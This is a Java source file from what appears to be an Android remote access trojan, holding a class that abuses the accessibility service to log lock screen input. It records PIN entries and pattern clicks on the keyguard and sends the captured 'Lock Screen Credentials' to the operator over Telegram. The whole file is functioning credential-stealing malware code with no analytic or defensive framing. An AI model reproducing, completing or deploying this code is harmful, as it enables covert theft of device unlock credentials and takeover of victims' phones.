package com.enterprise.rat.commands;

import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.TelegramApi;

public class LockScreenCaptureManager {
    private static StringBuilder pinBuffer = new StringBuilder();
    private static boolean capturing = false;

    public static void startCapture() {
        capturing = true;
        pinBuffer.setLength(0);
        AccessibilityService service = AccessibilityService.getInstance();
        if (service != null) {
            service.setLockScreenCaptureEnabled(true);
            TelegramApi.sendMessage("🔑 Lock screen capture enabled. Keylogger will capture PIN/pattern.");
        } else {
            TelegramApi.sendMessage("❌ Accessibility Service not active.");
        }
    }

    public static void stopCapture() {
        capturing = false;
        AccessibilityService service = AccessibilityService.getInstance();
        if (service != null) service.setLockScreenCaptureEnabled(false);
        String data = pinBuffer.toString();
        if (!data.isEmpty()) {
            TelegramApi.sendMessage("<b>🔓 Lock Screen Credentials Captured:</b>\n<code>" + data + "</code>");
            pinBuffer.setLength(0);
        } else {
            TelegramApi.sendMessage("🔑 No lock screen credentials captured.");
        }
    }

    public static void feedAccessibilityEvent(AccessibilityEvent event) {
        if (!capturing) return;
        // Deteksi keyguard (lock screen)
        if (event.getPackageName() != null && event.getPackageName().toString().contains("keyguard")) {
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                if (event.getText() != null && event.getText().size() > 0) {
                    pinBuffer.append(event.getText().get(0).toString());
                }
            } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    String text = source.getText() != null ? source.getText().toString() : "";
                    String desc = source.getContentDescription() != null ? source.getContentDescription().toString() : "";
                    if (!text.isEmpty() || !desc.isEmpty()) {
                        pinBuffer.append("[CLICK:").append(text).append("/").append(desc).append("]");
                    }
                    source.recycle();
                }
            }
        }
    }
}
